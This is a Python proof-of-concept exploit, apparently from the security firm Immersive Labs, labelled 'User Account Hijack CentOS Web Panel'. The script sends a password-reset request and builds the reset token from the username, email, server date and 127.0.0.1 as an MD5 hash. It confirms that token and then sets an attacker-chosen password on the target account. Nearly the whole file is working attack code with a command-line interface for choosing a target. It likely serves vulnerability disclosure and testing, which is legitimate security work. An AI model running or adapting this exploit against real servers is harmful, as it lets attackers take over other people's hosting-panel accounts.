# Copyright (C) 2022 Kev Breen, Immersive Labs
# https://github.com/Immersive-Labs-Sec/
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import argparse
import hashlib
import requests
import urllib3

from base64 import b64encode
from datetime import datetime

# Disable the Insecure Warnings for self signed certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "http://127.0.0.1:8080",
}


session = requests.session()


def trigger_reset(username, email_address, base_url):
    """Send a post request to trigger a password reset"""

    post_data = {
        "username": username,
        "email": email_address
    }

    reset_url = f'{base_url}/login/index.php?acc=lostpass'

    response = session.post(reset_url, data=post_data, verify=False)

    if response.content == b'1':

        # We need the time of the request
        response_date = response.headers['Date']
        to_datetime = datetime.strptime(response_date, '%a, %d %b %Y %H:%M:%S %Z')
        date_string = to_datetime.strftime('%Y-%m-%d %H:%M:%S')
        return date_string


def set_password(reset_token, new_password, base_url):
    """Send the calculated token and a new password to set"""

    new_password = new_password.encode()
    # Token has to be encapsulated in single quotes!
    post_data = {
        "pass1": b64encode(new_password),
        "pass2": b64encode(new_password),
        "token": f"'{reset_token}'",
        "idsession": f"'{reset_token}'"
    }

    new_pass_url = f'{base_url}/login/index.php?acc=newpass'

    response = session.post(new_pass_url, data=post_data, verify=False)

    if response.content == b'1':
        return True


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='User Account Hijack CentOS Web Panel')
    parser.add_argument(
        '--target',
        help='Target Host e.g. 54.32.155.22',
        required=True)

    parser.add_argument(
        '--username',
        help='Username of the account to hijack',
        required=True)

    parser.add_argument(
        '--email_address',
        help='Email Address of the account to hijack',
        required=True)

    parser.add_argument(
        '--password',
        help="New Password to set for the account",
        required=True,
        default=None
    )

    parser.add_argument(
        '--proxy',
        help="Proxy Requests through a default local BURP instance",
        required=False,
        action='store_true'
    )


    args = parser.parse_args()

    if args.proxy:
        session.proxies.update(proxies)

    base_url = f'https://{args.target}:2083'

    print(f'[+] Sending Reset Request to Target')
    # Send the reset request and get the date string back
    date_string = trigger_reset(args.username, args.email_address, base_url)

    if not date_string:
        print(f'[!] Unable to trigger reset request')
        exit()

    print(f'  [-] Got Date {date_string} from response')
    # format the token
    token_string = f'{args.username}||{args.email_address}||{date_string}||127.0.0.1'
    #token_string = f'{args.username}||{args.email_address}||{date_string}||127.0.0.1||CWP2022'

    # hash the token with md5

    print(f'  [-] Generating Reset Token with username, email and reset token')
    reset_token = hashlib.md5(token_string.encode('utf-8')).hexdigest()
    print(f'  [*] Token: {reset_token}')

    print('[+] Confirming Reset Token')
    confirm_url = f'{base_url}/login/?acc=reconfir&idsession={reset_token}'
    confirm_response = session.get(confirm_url, verify=False)

    if b'Retype your password' not in confirm_response.content:
        print('[!] Invalid Reponse from Confirmation request')
        exit()


    # Do we need to hit the reconfir path? 
    print(f'[+] Sending New Password with Reset Token')
    account_reset = set_password(reset_token, args.password, base_url) 

    if account_reset:
        print(f'[*] Password has been set to "{args.password}" for username "{args.username}"')
    else:
        print(f'[!] There was an error setting the password')

